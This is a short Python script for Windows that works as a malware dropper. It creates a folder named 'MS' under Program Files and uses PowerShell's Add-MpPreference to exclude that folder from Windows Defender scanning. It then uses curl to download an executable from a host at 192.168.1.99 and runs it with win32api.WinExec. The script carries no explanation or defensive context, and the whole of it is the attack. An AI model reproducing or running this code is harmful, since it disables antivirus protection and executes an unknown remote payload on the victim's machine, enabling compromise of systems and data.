import os
import win32api
os.system('mkdir "C:/Program Files (x86)/MS"')
os.system("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath 'C:/Program Files (x86)/MS'")
os.system('curl http://192.168.1.99:1345/1212.exe -o "C:/Program Files (x86)/MS/1212.exe"')
win32api.WinExec('C:/Program Files (x86)/MS/1212.exe')
exit
